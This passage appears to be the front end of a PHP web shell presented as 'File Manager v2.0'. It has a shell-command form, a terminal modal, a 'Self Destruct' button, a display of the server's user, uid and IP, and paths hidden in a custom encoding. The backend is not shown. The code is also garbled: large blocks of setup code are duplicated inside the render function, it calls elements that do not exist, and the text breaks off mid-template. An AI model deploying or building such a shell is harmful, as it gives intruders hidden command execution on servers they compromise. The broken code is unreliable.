        .text-muted {
            color: var(--text-muted);
        }

        .text-secondary {
            color: var(--text-secondary);
        }

        .w-full {
            width: 100%;
        }

        .h-full {
            height: 100%;
        }

        /* Card / Panels */
        .card {
            background-color: var(--bg-background);
            border: 1px solid var(--border-default);
            border-radius: var(--radius-md);
            padding: 16px;
        }

        /* Buttons */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding: 6px 12px;
            font-size: 12px;
            font-weight: 500;
            border-radius: var(--radius-sm);
            border: 1px solid var(--border-default);
            background-color: var(--bg-subtle);
            color: var(--text-primary);
            transition: all 0.15s ease;
            cursor: pointer;
            height: 32px;
        }

        .btn:hover {
            background-color: var(--bg-hover);
            border-color: var(--text-muted);
        }

        .btn-primary {
            background-color: var(--text-primary);
            color: var(--text-inverted);
            border-color: var(--text-primary);
        }

        .btn-primary:hover {
            opacity: 0.9;
            background-color: #e4e4e7;
        }

        .btn-danger {
            color: var(--color-red);
            border-color: rgba(239, 68, 68, 0.2);
            background-color: rgba(239, 68, 68, 0.05);
        }

        .btn-danger:hover {
            background-color: rgba(239, 68, 68, 0.1);
            border-color: var(--color-red);
        }

        .btn-icon {
            padding: 0;
            width: 32px;
            height: 32px;
        }

        .btn-xs {
            height: 24px;
            padding: 0 8px;
            font-size: 11px;
        }

        /* Inputs */
        input[type="text"],
        input[type="password"],
        input[type="number"],
        select,
        textarea {
            background-color: var(--bg-background);
            border: 1px solid var(--border-default);
            color: var(--text-primary);
            border-radius: var(--radius-sm);
            padding: 6px 10px;
            font-size: 13px;
            font-family: var(--font-sans);
            transition: border-color 0.15s;
            width: 100%;
        }

        input:focus,
        select:focus,
        textarea:focus {
            outline: none;
            border-color: var(--text-muted);
            box-shadow: 0 0 0 1px var(--bg-hover);
        }

        /* Header / Top Bar */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border-default);
            margin-bottom: 12px;
        }

        .branding {
            font-weight: 700;
            font-size: 16px;
            letter-spacing: -0.5px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        /* System Info */
        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 8px;
            font-size: 11px;
            color: var(--text-secondary);
            background: var(--bg-subtle);
            padding: 12px;
            border-radius: var(--radius-md);
            border: 1px solid var(--border-default);
            margin-bottom: 12px;
        }

        .info-item {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .info-label {
            color: var(--text-muted);
        }

        .status-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            display: inline-block;
        }

        .status-on {
            background-color: var(--color-green);
        }

        .status-off {
            background-color: var(--color-red);
        }

        /* Navigation */
        .nav-bar {
            display: flex;
            align-items: center;
            gap: 8px;
            background: var(--bg-background);
            border: 1px solid var(--border-default);
            padding: 4px;
            border-radius: var(--radius-md);
        }

        .path-display {
            flex: 1;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            padding: 0 8px;
            gap: 4px;
            font-family: var(--font-mono);
            font-size: 12px;
        }

        .crumb {
            color: var(--text-secondary);
            padding: 2px 6px;
            border-radius: var(--radius-sm);
            transition: color 0.15s;
        }

        .crumb:hover {
            color: var(--text-primary);
            background: var(--bg-hover);
        }

        .crumb-sep {
            color: var(--text-muted);
        }

        .crumb-root {
            color: var(--text-primary);
            font-weight: 600;
        }

        /* File Table */
        .file-list-container {
            border: 1px solid var(--border-default);
            border-radius: var(--radius-md);
            overflow: hidden;
            background: var(--bg-background);
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }

        .file-table th {
            text-align: left;
            padding: 10px 12px;
            font-weight: 500;
            color: var(--text-muted);
            border-bottom: 1px solid var(--border-default);
            background: var(--bg-subtle);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .file-table td {
            padding: 8px 12px;
            border-bottom: 1px solid var(--border-default);
            color: var(--text-secondary);
            transition: background 0.1s;
        }

        .file-table tr:last-child td {
            border-bottom: none;
        }

        .file-table tr:hover td {
            background-color: var(--bg-hover);
            color: var(--text-primary);
        }

        .file-table tr.selected td {
            background-color: rgba(255, 255, 255, 0.03);
        }

        .col-icon {
            width: 30px;
            text-align: center;
            color: var(--text-muted);
            font-size: 14px;
        }

        .col-name {
            font-weight: 500;
            color: var(--text-primary);
        }

        .col-name a {
            display: block;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .col-meta {
            font-family: var(--font-mono);
            font-size: 11px;
            color: var(--text-muted);
        }

        .col-actions {
            width: 120px;
            text-align: right;
        }

        .action-group {
            display: inline-flex;
            gap: 2px;
            opacity: 0.4;
            transition: opacity 0.2s;
        }

        .file-table tr:hover .action-group {
            opacity: 1;
        }

        .action-btn {
            width: 24px;
            height: 24px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border-radius: var(--radius-sm);
            color: var(--text-secondary);
        }

        .action-btn:hover {
            background-color: var(--bg-active);
            color: var(--text-primary);
        }

        /* Editor */
        #edit-view {
            display: none;
            height: calc(100vh - 100px);
        }

        .editor-container {
            display: flex;
            flex-direction: column;
            height: 100%;
            gap: 12px;
        }

        .editor-toolbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px;
            background: var(--bg-subtle);
            border: 1px solid var(--border-default);
            border-radius: var(--radius-md);
        }

        #edit-content {
            flex: 1;
            background: var(--bg-background);
            border: 1px solid var(--border-default);
            border-radius: var(--radius-md);
            padding: 16px;
            font-family: var(--font-mono);
            font-size: 13px;
            line-height: 1.6;
            color: var(--text-primary);
            resize: none;
        }

        /* Terminal */
        #terminal-modal {
            position: fixed;
            inset: 0;
            background: var(--bg-overlay);
            backdrop-filter: blur(4px);
            z-index: 50;
            display: none;
            align-items: center;
            justify-content: center;
        }

        .terminal-window {
            width: 800px;
            height: 500px;
            background: #09090b;
            border: 1px solid var(--border-default);
            border-radius: var(--radius-md);
            display: flex;
            flex-direction: column;
            box-shadow: var(--shadow-md);
        }

        .terminal-bar {
            padding: 8px 12px;
            border-bottom: 1px solid var(--border-default);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--bg-subtle);
        }

        .terminal-content {
            flex: 1;
            padding: 12px;
            font-family: var(--font-mono);
            font-size: 12px;
            overflow-y: auto;
            color: #d4d4d8;
        }

        .terminal-input-line {
            display: flex;
            border-top: 1px solid var(--border-default);
            padding: 8px;
            background: var(--bg-background);
        }

        .terminal-input {
            flex: 1;
            background: transparent;
            border: none;
            color: var(--text-primary);
            font-family: var(--font-mono);
            font-size: 12px;
            padding: 0 8px;
        }

        /* Context Menu */
        .context-menu {
            position: fixed;
            background: var(--bg-background);
            border: 1px solid var(--border-default);
            border-radius: var(--radius-md);
            padding: 4px;
            min-width: 180px;
            box-shadow: var(--shadow-md);
            z-index: 100;
            display: none;
        }

        .context-item {
            padding: 6px 10px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: var(--text-primary);
            border-radius: var(--radius-sm);
            cursor: pointer;
        }

        .context-item:hover {
            background: var(--bg-hover);
        }

        .context-item i {
            width: 16px;
            text-align: center;
            color: var(--text-muted);
        }

        /* Modal */
        #modal-overlay {
            position: fixed;
            inset: 0;
            background: var(--bg-overlay);
            backdrop-filter: blur(2px);
            z-index: 40;
            display: none;
            align-items: center;
            justify-content: center;
        }

        .modal-box {
            width: 400px;
            background: var(--bg-background);
            border: 1px solid var(--border-default);
            border-radius: var(--radius-md);
            padding: 20px;
            box-shadow: var(--shadow-md);
        }

        .modal-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 16px;
        }

        /* Utilities */
        .hidden {
            display: none !important;
        }

        .text-green {
            color: var(--color-green);
        }

        .text-red {
            color: var(--color-red);
        }

        .text-blue {
            color: var(--color-blue);
        }

        /* Message */
        .message-toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 12px 16px;
            background: var(--bg-subtle);
            border: 1px solid var(--border-default);
            border-radius: var(--radius-md);
            color: var(--text-primary);
            font-size: 13px;
            box-shadow: var(--shadow-md);
            z-index: 200;
            animation: slideIn 0.3s ease;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .message-toast.error {
            border-color: var(--color-red);
            color: var(--color-red);
        }

        @keyframes slideIn {
            from {
                transform: translateY(20px);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <div class="container" id="app-container">
        <div class="top-bar">
            <div class="branding">
                <i class="fa-solid fa-layer-group text-blue-500"></i>
                <span>File Manager <span class="text-muted text-xs font-mono">v2.0</span></span>
            </div>
            <div class="flex gap-2">
                <a id="sec-info-btn" class="btn btn-xs">
                    <i class="fa-solid fa-shield-halved"></i> Security
                </a>
                <a id="terminal-btn" class="btn btn-xs">
                    <?php echo $icons['terminal']; ?> Terminal
                </a>
                <a id="self-remove-btn" class="btn btn-xs btn-danger">
                    <i class="fa-solid fa-trash"></i> Self Destruct
                </a>
            </div>
        </div>

        <div class="system-info">
            <div class="info-item">
                <span class="info-label">System:</span>
                <span class="text-primary"><?php echo php_uname('s') . ' ' . php_uname('r'); ?></span>
            </div>
            <div class="info-item">
                <span class="info-label">User:</span>
                <span class="text-primary"><?php echo "$user"; ?></span>
                <span class="text-muted text-xs">(<?php echo "$uid:$gid"; ?>)</span>
            </div>
            <div class="info-item">
                <span class="info-label">PHP:</span>
                <span class="text-primary"><?php echo PHP_VERSION; ?></span>
            </div>
            <div class="info-item">
                <span class="info-label">IP:</span>
                <span class="text-primary"><?php echo $_SERVER['SERVER_ADDR']; ?></span>
            </div>
            <div class="info-item">
                <span class="info-label">Storage:</span>
                <span class="text-primary"><?php echo format_size($free_space); ?> free</span>
                <span class="text-muted text-xs">/ <?php echo format_size($total_space); ?></span>
            </div>
        </div>

        <div class="nav-bar">
            <div class="path-display" id="path-bar"></div>
            <div class="flex gap-2">
                <a id="refresh-btn" class="btn btn-icon" title="Refresh">
                    <i class="fa-solid fa-rotate-right"></i>
                </a>
                <a href="#<?php echo basezero_encoder($script_dir); ?>" class="btn btn-icon" title="Home">
                    <?php echo $icons['home']; ?>
                </a>
            </div>
        </div>

        <div id="message-container">
            <?php if ($message): ?>
                <div class="message-toast <?php echo (strpos(strtolower($message), 'error') !== false) ? 'error' : ''; ?>">
                    <i class="fa-solid fa-circle-info"></i>
                    <?php echo htmlspecialchars($message); ?>
                </div>
            <?php endif; ?>
        </div>

        <div id="main-content">
            <div id="listing-view">
                <!-- Toolbar -->
                <div class="card" style="margin-bottom: 12px; padding: 12px;">
                    <div class="flex justify-between items-center flex-wrap gap-4">
                        <!-- Upload -->
                        <form method="POST" enctype="multipart/form-data" class="flex gap-2 items-center">
                            <input type="hidden" name="current_dir" class="form_current_dir">
                            <label class="btn">
                                <i class="fa-solid fa-upload"></i> Upload
                                <input type="file" name="upload_file[]" multiple required style="display:none;"
                                    onchange="this.form.submit()">
                            </label>
                        </form>

                        <!-- Actions -->
                        <div class="flex gap-2">
                            <form method="POST" class="flex gap-2">
                                <input type="hidden" name="action" value="create_file">
                                <input type="hidden" name="current_dir" class="form_current_dir">
                                <input type="text" name="filename" placeholder="New file..." required
                                    style="width: 120px;">
                                <button type="submit" class="btn btn-icon"><i class="fa-solid fa-plus"></i></button>
                            </form>
                            <form method="POST" class="flex gap-2">
                                <input type="hidden" name="action" value="create_dir">
                                <input type="hidden" name="current_dir" class="form_current_dir">
                                <input type="text" name="dirname" placeholder="New folder..." required
                                    style="width: 120px;">
                                <button type="submit" class="btn btn-icon"><i
                                        class="fa-solid fa-folder-plus"></i></button>
                            </form>
                        </div>
                    </div>
                </div>

                <!-- Quick Commands -->
                <div class="card" style="margin-bottom: 12px; padding: 12px;">
                    <div class="flex gap-4 items-center">
                        <div class="flex-1">
                            <form method="POST" class="flex gap-2 w-full">
                                <input type="hidden" name="action" value="execute_cmd">
                                <input type="hidden" name="current_dir" class="form_current_dir">
                                <div class="flex w-full gap-2">
                                    <span class="text-muted font-mono self-center">$</span>
                                    <input type="text" name="c" placeholder="Quick command..."
                                        class="font-mono text-sm">
                                </div>
                            </form>
                        </div>
                        <div class="flex gap-2">
                            <input type="text" id="path-input" placeholder="Go to path..." style="width: 150px;">
                            <button type="button" id="path-go-btn" class="btn btn-icon"><i
                                    class="fa-solid fa-arrow-right"></i></button>
                        </div>
                    </div>
                    <?php if (isset($_SESSION['cmd_output'])): ?>
                        <div style="position: relative; margin-top: 10px;">
                            <pre
                                style="background: var(--bg-subtle); color: var(--text-primary); padding: 12px; border-radius: var(--radius-sm); white-space: pre-wrap; word-break: break-word; font-family: var(--font-mono); font-size: 11px; border: 1px solid var(--border-default);"><?php echo htmlspecialchars($_SESSION['cmd_output']);
                                unset($_SESSION['cmd_output']); ?></pre>
                            <button class="clear-output-btn" onclick="this.parentElement.remove();"><i
                                    class="fa-solid fa-xmark"></i></button>
                        </div>
                    <?php endif; ?>
                </div>

                <!-- File List -->
                <div class="file-list-container">
                    <div class="flex justify-between items-center"
                        style="padding: 8px 12px; border-bottom: 1px solid var(--border-default); background: var(--bg-subtle);">
                        <div class="flex gap-2 items-center">
                            <input type="checkbox" id="select-all">
                            <select id="bulk-action-select" style="width: 140px;">
                                <option value="" disabled selected>Bulk Action...</option>
                                <option value="delete">Delete</option>
                                <option value="copy">Copy</option>
                                <option value="move">Move</option>
                                <option value="compress">Compress</option>
                                <option value="download">Download</option>
                            </select>
                            <button type="button" id="apply-bulk-action-btn" class="btn btn-xs">Apply</button>
                            <span id="paste-option-container"></span>
                        </div>
                        <div class="flex gap-2 items-center">
                            <i class="fa-solid fa-magnifying-glass text-muted"></i>
                            <input type="text" id="file-search" placeholder="Filter..."
                                style="width: 150px; background: transparent; border: none; padding: 0;">
                        </div>
                    </div>

                    <table class="file-table">
                        <thead>
                            <tr>
                                <th class="col-select"></th>
                                <th class="col-icon"></th>
                                <th class="col-name">Name</th>
                                <th class="col-size">Size</th>
                                <th class="col-owner">Owner</th>
                                <th class="col-perms">Perms</th>
                                <th class="col-date">Modified</th>
                                <th class="col-actions"></th>
                            </tr>
                        </thead>
                        <tbody id="file-list"></tbody>
                    </table>
                    <div id="no-results" class="no-results" style="display: none;">
                        No files found.
                    </div>
                </div>
            </div>

            <div id="edit-view">
                <div class="editor-container">
                    <div class="editor-toolbar">
                        <div class="flex items-center gap-2">
                            <button type="button" id="edit-cancel-btn" class="btn"><i
                                    class="fa-solid fa-arrow-left"></i> Back</button>
                            <span id="edit-view-filename" class="font-mono font-bold"></span>
                            <span id="editor-info" class="text-muted text-xs font-mono"></span>
                        </div>
                        <div class="flex gap-2" id="editor-actions">
                            <!-- Actions injected by JS -->
                        </div>
                    </div>
                    <form id="edit-form" class="h-full flex flex-col">
                        <input type="hidden" name="action" value="edit">
                        <input type="hidden" name="ajax" value="1">
                        <input type="hidden" name="file" id="edit-file-path">
                        <textarea name="content" id="edit-content" spellcheck="false"></textarea>
                        <div class="flex justify-end gap-2" style="margin-top: 12px;">
                            <button type="submit" class="btn btn-primary"><i class="fa-solid fa-save"></i> Save
                                Changes</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div id="modal-overlay">
            <div id="modal-box" class="modal-box">
                <h3 id="modal-title" class="modal-title"></h3>
                <form id="modal-form" method="POST">
                    <input type="hidden" name="action" id="modal-action">
                    <input type="hidden" name="file" id="modal-file-path">
                    <input type="hidden" name="current_dir" class="form_current_dir">
                    <div id="modal-body" style="margin-bottom: 20px;"></div>
                    <div class="flex justify-end gap-2">
                        <a id="modal-cancel-btn" class="btn">Cancel</a>
                        <button type="submit" class="btn btn-primary">Confirm</button>
                    </div>
                </form>
            </div>
        </div>

        <div id="terminal-modal">
            <div class="terminal-window">
                <div class="terminal-bar">
                    <span class="font-bold text-sm"><i class="fa-solid fa-terminal"></i> Terminal</span>
                    <button class="btn btn-xs btn-danger" id="terminal-close-btn"><i
                            class="fa-solid fa-xmark"></i></button>
                </div>
                <div class="command-history" id="command-history"></div>
                <div class="terminal-content" id="terminal-output"></div>
                <div class="terminal-input-line">
                    <span class="text-green font-mono"><i class="fa-solid fa-angle-right"></i></span>
                    <input type="text" id="terminal-input" name="c" class="terminal-input" placeholder="Type command..."
                        autocomplete="off">
                </div>
            </div>
        </div>

        <div id="context-menu" class="context-menu"></div>
    </div>

    <script>
        const ICONS = <?php echo json_encode($icons); ?>;
        const BASEZERO_ALPHABET = '<?php echo BASEZERO_ALPHABET; ?>';
        const SCRIPT_NAME = '<?php echo basename($_SERVER['PHP_SELF']); ?>';

        function basezero_encoder_js(input) {
            let o = '';
            for (let i = 0; i < input.length; i++) {
                const v = input.charCodeAt(i);
                o += BASEZERO_ALPHABET[Math.floor(v / BASEZERO_ALPHABET.length)] + BASEZERO_ALPHABET[v % BASEZERO_ALPHABET.length];
            }
            return o;
        }

        function basezero_decoder_js(input) {
            if (input.length % 2 !== 0) return false;
            let o = '';
            const map = Object.fromEntries(Array.from(BASEZERO_ALPHABET).map((c, i) => [c, i]));
            for (let i = 0; i < input.length; i += 2) {
                const c1 = map[input[i]], c2 = map[input[i + 1]];
                if (c1 === undefined || c2 === undefined) return false;
                o += String.fromCharCode((c1 * BASEZERO_ALPHABET.length) + c2);
            }
            return o;
        }

        document.addEventListener('DOMContentLoaded', () => {
            const app = {
                pathBar: document.getElementById('path-bar'),
                fileList: document.getElementById('file-list'),
                listingView: document.getElementById('listing-view'),
                editView: document.getElementById('edit-view'),
                messageContainer: document.getElementById('message-container'),
                modalOverlay: document.getElementById('modal-overlay'),
                modalTitle: document.getElementById('modal-title'),
                modalBody: document.getElementById('modal-body'),
                modalAction: document.getElementById('modal-action'),
                modalFilePath: document.getElementById('modal-file-path'),
                currentPath: '',
                pasteContainer: document.getElementById('paste-option-container'),
                fileSearch: document.getElementById('file-search'),
                contextMenu: document.getElementById('context-menu'),
                contextTarget: null,
                filesData: [],
                terminalHistory: [],
                terminalModal: document.getElementById('terminal-modal'),
                terminalOutput: document.getElementById('terminal-output'),
                terminalInput: document.getElementById('terminal-input'),
                isWindows: false,
                currentUser: 'user',
                customHistory: <?php echo json_encode($_SESSION['cmd_history']); ?>,
                historyIndex: -1,

                init() {
                    this.handleHashChange();
                    window.addEventListener('hashchange', () => this.handleHashChange());

                    document.getElementById('path-go-btn').addEventListener('click', () => this.navigateToPath());
                    document.getElementById('path-input').addEventListener('keypress', e => {
                        if (e.key === 'Enter') this.navigateToPath();
                    });

                    // FIXED: File open functionality
                    document.getElementById('file-open-btn').addEventListener('click', () => this.openFileByPath());
                    document.getElementById('file-path-input').addEventListener('keypress', e => {
                        if (e.key === 'Enter') this.openFileByPath();
                    });

                    document.getElementById('sec-info-btn').addEventListener('click', () => this.showSecurityInfo());
                    document.getElementById('self-remove-btn').addEventListener('click', () => this.confirmSelfRemove());
                    document.getElementById('edit-form').addEventListener('submit', e => this.handleEditSave(e));
                    document.getElementById('edit-cancel-btn').addEventListener('click', e => this.showListingView(e));
                    document.getElementById('file-list').addEventListener('click', e => this.handleActionClick(e));
                    document.getElementById('refresh-btn').addEventListener('click', e => { e.preventDefault(); this.handleHashChange(); });
                    document.getElementById('terminal-btn').addEventListener('click', e => { e.preventDefault(); this.showTerminal(); });
                    document.getElementById('terminal-close-btn').addEventListener('click', e => { e.preventDefault(); this.hideTerminal(); });
                    document.getElementById('apply-bulk-action-btn').addEventListener('click', e => this.handleBulkAction(e));
                    document.getElementById('select-all').addEventListener('change', e => this.toggleSelectAll(e));
                    document.getElementById('file-list').addEventListener('change', e => this.handleRowSelect(e));
                    document.getElementById('modal-cancel-btn').addEventListener('click', e => { e.preventDefault(); this.hideModal(); });

                    this.modalOverlay.addEventListener('click', e => { if (e.target === this.modalOverlay) this.hideModal(); });
                    this.terminalModal.addEventListener('click', e => { if (e.target === this.terminalModal) this.hideTerminal(); });
                    this.fileSearch.addEventListener('input', e => this.handleSearch(e));

                    document.addEventListener('contextmenu', e => this.handleContextMenu(e));
                    document.addEventListener('click', e => this.hideContextMenu(e));
                    window.addEventListener('resize', () => this.hideContextMenu());

                    document.getElementById('terminal-send').addEventListener('click', e => this.sendCommand());
                    this.terminalInput.addEventListener('keydown', e => {
                        if (e.key === 'Enter') {
                            e.preventDefault();
                            this.sendCommand();
                        } else if (e.key === 'ArrowUp') {
                            e.preventDefault();
                            if (this.historyIndex < this.customHistory.length - 1) {
                                this.historyIndex++;
                                this.terminalInput.value = this.customHistory[this.historyIndex];
                            }
                        } else if (e.key === 'ArrowDown') {
                            e.preventDefault();
                            if (this.historyIndex > 0) {
                                this.historyIndex--;
                                this.terminalInput.value = this.customHistory[this.historyIndex];
                            } else if (this.historyIndex === 0) {
                                this.historyIndex = -1;
                                this.terminalInput.value = '';
                            }
                        }
                    });
                },

                // FIXED: Update file path placeholder
                updateFilePathPlaceholder() {
                    const input = document.getElementById('file-path-input');
                    if (input && this.currentPath) {
                        input.placeholder = `filename.txt or ${this.currentPath}/filename.txt`;
                    }
                },

                // FIXED: Open file by path functionality
                async openFileByPath() {
                    const input = document.getElementById('file-path-input');
                    const filePath = input.value.trim();

                    if (!filePath) {
                        this.showMessage('Please enter a file path.', true);
                        return;
                    }

                    try {
                        const formData = new FormData();
                        formData.append('file_path', filePath);
                        formData.append('current_path', this.currentPath);

                        const response = await fetch(`${SCRIPT_NAME}?action=open_file_by_path`, {
                            method: 'POST',
                            body: formData
                        });

                        const result = await response.json();

                        if (result.success && result.action === 'open_editor') {
                            input.value = '';
                            this.openEditorWithFileData(result);
                        } else {
                            this.showMessage(result.message, true);
                            setTimeout(() => {
                                const currentMessage = this.messageContainer.querySelector('.message.error');
                                if (currentMessage) {
                                    this.messageContainer.innerHTML = '';
                                }
                            }, 5000);
                        }

                    } catch (error) {
                        this.showMessage('Network error: ' + error.message, true);
                        setTimeout(() => {
                            const currentMessage = this.messageContainer.querySelector('.message.error');
                            if (currentMessage) {
                                this.messageContainer.innerHTML = '';
                            }
                        }, 5000);
                    }
                },

                // FIXED: Open editor with enhanced file data and CONSISTENT action buttons
                openEditorWithFileData(fileData) {
                    document.getElementById('edit-view-filename').textContent = `Editing: ${fileData.filename}`;
                    document.getElementById('edit-file-path').value = fileData.file_path;

                    const textarea = document.getElementById('edit-content');
                    const infoDiv = document.getElementById('editor-info');

                    let typeInput = document.getElementById('edit-file-type');
                    let encodingInput = document.getElementById('edit-encoding');

                    if (!typeInput) {
                        typeInput = document.createElement('input');
                        typeInput.type = 'hidden';
                        typeInput.name = 'file_type';
                        typeInput.id = 'edit-file-type';
                        document.getElementById('edit-form').appendChild(typeInput);
                    }

                    if (!encodingInput) {
                        encodingInput = document.createElement('input');
                        encodingInput.type = 'hidden';
                        encodingInput.name = 'encoding';
                        encodingInput.id = 'edit-encoding';
                        document.getElementById('edit-form').appendChild(encodingInput);
                    }

                    typeInput.value = fileData.file_type;
                    encodingInput.value = fileData.encoding;
                    textarea.value = fileData.content;

                    const byteLength = new Blob([fileData.content]).size;
                    const lineCount = fileData.content.split('\n').length;
                    const fileInfo = `${lineCount} lines, ${byteLength} bytes`;
                    const typeInfo = fileData.file_type === 'binary' ?
                        `Binary file (${fileData.printable_ratio}% printable)` :
                        `Mixed content (${fileData.printable_ratio}% printable)`;
                    const permInfo = `${fileData.permissions} | ${fileData.owner} | ${fileData.modified}`;

                    infoDiv.innerHTML = `
                <div style="margin-bottom: 8px;">
                    ${fileInfo} | ${typeInfo}<br>
                    Permissions: ${permInfo}
                </div>
                <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                    <button type="button" onclick="app.fileAction('chmod', '${fileData.file_path}', '${fileData.permissions}')" class="btn-small">Chmod</button>
                    <button type="button" onclick="app.fileAction('rename', '${fileData.file_path}')" class="btn-small">Rename</button>
                    <button type="button" onclick="app.fileAction('touch', '${fileData.file_path}', '${fileData.modified}')" class="btn-small">Touch</button>
                    <button type="button" onclick="window.open('${SCRIPT_NAME}?action=download&file=${encodeURIComponent(fileData.file_path)}', '_blank')" class="btn-small">Download</button>
                    <button type="button" onclick="app.fileAction('delete', '${fileData.file_path}')" class="btn-small danger" style="background: var(--color-red); color: white;">Delete</button>
                </div>
            `;

                    this.listingView.style.display = 'none';
                    this.editView.style.display = 'block';

                    setTimeout(() => textarea.focus(), 100);
                },

                // FIXED: Handle file actions from editor
                fileAction(action, filePath, currentValue = '') {
                    const fileData = {
                        name: filePath.split('/').pop().split('\\').pop(), // Handle both / and \
                        path: filePath,
                        perms: currentValue,
                        modified: currentValue
                    };

                    this.handleActionModal(action, fileData);
                },

                async handleHashChange() {
                    this.hideModal();
                    this.hideTerminal();
                    const pathEncoded = window.location.hash.substring(1);
                    if (!pathEncoded) {
                        const currentDir = '<?php echo addslashes(getcwd()); ?>';
                        window.location.hash = basezero_encoder_js(currentDir);
                        return;
                    }
                    this.fetchDirectory(pathEncoded);
                },

                async fetchDirectory(pathEncoded) {
                    this.fileList.innerHTML = `<tr><td colspan="7" style="text-align:center; padding:40px;">Loading...</td></tr>`;
                    try {
                        const response = await fetch(`${SCRIPT_NAME}?action=list&path=${pathEncoded}`);
                        const data = await response.json();
                        if (data.success) {
                            this.isWindows = data.path.is_windows;
                            this.currentUser = data.user;
                            this.render(data);
                        } else {
                            this.showMessage(data.message + (data.debug ? ' [Debug: ' + JSON.stringify(data.debug) + ']' : ''), true);
                        }
                    } catch (error) {
                        this.showMessage('Network or server error: ' + error.message, true);
                    }
                },

                render(data) {
                    this.currentPath = data.path.current;
                    this.filesData = data.files;
                    document.getElementById('terminal-close-btn').addEventListener('click', e => { e.preventDefault(); this.hideTerminal(); });
                    document.getElementById('apply-bulk-action-btn').addEventListener('click', e => this.handleBulkAction(e));
                    document.getElementById('select-all').addEventListener('change', e => this.toggleSelectAll(e));
                    document.getElementById('file-list').addEventListener('change', e => this.handleRowSelect(e));
                    document.getElementById('modal-cancel-btn').addEventListener('click', e => { e.preventDefault(); this.hideModal(); });

                             this.modalOverlay.addEventListener('click', e => { if (e.target === this.modalOverlay) this.hideModal(); });
                    this.terminalModal.addEventListener('click', e => { if (e.target === this.terminalModal) this.hideTerminal(); });
                    this.fileSearch.addEventListener('input', e => this.handleSearch(e));

                    document.addEventListener('contextmenu', e => this.handleContextMenu(e));
                    document.addEventListener('click', e => this.hideContextMenu(e));
                    window.addEventListener('resize', () => this.hideContextMenu());

                    document.getElementById('terminal-send').addEventListener('click', e => this.sendCommand());
                    this.terminalInput.addEventListener('keydown', e => {
                        if (e.key === 'Enter') {
                            e.preventDefault();
                            this.sendCommand();
                        } else if (e.key === 'ArrowUp') {
                            e.preventDefault();
                            if (this.historyIndex < this.customHistory.length - 1) {
                                this.historyIndex++;
                                this.terminalInput.value = this.customHistory[this.historyIndex];
                            }
                        } else if (e.key === 'ArrowDown') {
                            e.preventDefault();
                            if (this.historyIndex > 0) {
                                this.historyIndex--;
                                this.terminalInput.value = this.customHistory[this.historyIndex];
                            } else if (this.historyIndex === 0) {
                                this.historyIndex = -1;
                                this.terminalInput.value = '';
                            }
                        }
                    });
                },

                // FIXED: Update file path placeholder
                updateFilePathPlaceholder() {
                    const input = document.getElementById('file-path-input');
                    if (input && this.currentPath) {
                        input.placeholder = `filename.txt or ${this.currentPath}/filename.txt`;
                    }
                },

                // FIXED: Open file by path functionality
                async openFileByPath() {
                    const input = document.getElementById('file-path-input');
                    const filePath = input.value.trim();

                    if (!filePath) {
                        this.showMessage('Please enter a file path.', true);
                        return;
                    }

                    try {
                        const formData = new FormData();
                        formData.append('file_path', filePath);
                        formData.append('current_path', this.currentPath);

                        const response = await fetch(`${SCRIPT_NAME}?action=open_file_by_path`, {
                            method: 'POST',
                            body: formData
                        });

                        const result = await response.json();

                        if (result.success && result.action === 'open_editor') {
                            input.value = '';
                            this.openEditorWithFileData(result);
                        } else {
                            this.showMessage(result.message, true);
                            setTimeout(() => {
                                const currentMessage = this.messageContainer.querySelector('.message.error');
                                if (currentMessage) {
                                    this.messageContainer.innerHTML = '';
                                }
                            }, 5000);
                        }

                    } catch (error) {
                        this.showMessage('Network error: ' + error.message, true);
                        setTimeout(() => {
                            const currentMessage = this.messageContainer.querySelector('.message.error');
                            if (currentMessage) {
                                this.messageContainer.innerHTML = '';
                            }
                        }, 5000);
                    }
                },

                // FIXED: Open editor with enhanced file data and CONSISTENT action buttons
                openEditorWithFileData(fileData) {
                    document.getElementById('edit-view-filename').textContent = `Editing: ${fileData.filename}`;
                    document.getElementById('edit-file-path').value = fileData.file_path;

                    const textarea = document.getElementById('edit-content');
                    const infoDiv = document.getElementById('editor-info');

                    let typeInput = document.getElementById('edit-file-type');
                    let encodingInput = document.getElementById('edit-encoding');

                    if (!typeInput) {
                        typeInput = document.createElement('input');
                        typeInput.type = 'hidden';
                        typeInput.name = 'file_type';
                        typeInput.id = 'edit-file-type';
                        document.getElementById('edit-form').appendChild(typeInput);
                    }

                    if (!encodingInput) {
                        encodingInput = document.createElement('input');
                        encodingInput.type = 'hidden';
                        encodingInput.name = 'encoding';
                        encodingInput.id = 'edit-encoding';
                        document.getElementById('edit-form').appendChild(encodingInput);
                    }

                    typeInput.value = fileData.file_type;
                    encodingInput.value = fileData.encoding;
                    textarea.value = fileData.content;

                    const byteLength = new Blob([fileData.content]).size;
                    const lineCount = fileData.content.split('\n').length;
                    const fileInfo = `${lineCount} lines, ${byteLength} bytes`;
                    const typeInfo = fileData.file_type === 'binary' ?
                        `Binary file (${fileData.printable_ratio}% printable)` :
                        `Mixed content (${fileData.printable_ratio}% printable)`;
                    const permInfo = `${fileData.permissions} | ${fileData.owner} | ${fileData.modified}`;

                    infoDiv.innerHTML = `
                <div style="margin-bottom: 8px;">
                    ${fileInfo} | ${typeInfo}<br>
